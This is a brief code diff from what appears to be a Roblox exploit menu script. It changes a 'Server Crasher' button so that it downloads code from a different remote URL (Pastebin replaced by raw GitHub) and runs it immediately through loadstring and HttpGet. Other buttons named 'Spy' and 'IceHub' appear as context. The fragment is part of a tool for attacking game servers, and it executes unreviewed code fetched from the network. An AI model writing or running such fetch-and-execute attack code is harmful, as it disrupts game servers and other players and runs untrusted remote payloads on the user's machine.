@@ -39,7 +39,7 @@ Section:NewButton("Spy", "Spy", function()
 end)
 
 Section:NewButton("Server Crasher", "Server Crasher", function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/yfN4Y1tU"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IsMyDevvyHere/cr/main/cr.txt"))()
 end)
 
 Section:NewButton("IceHub", "ICEHUB", function()
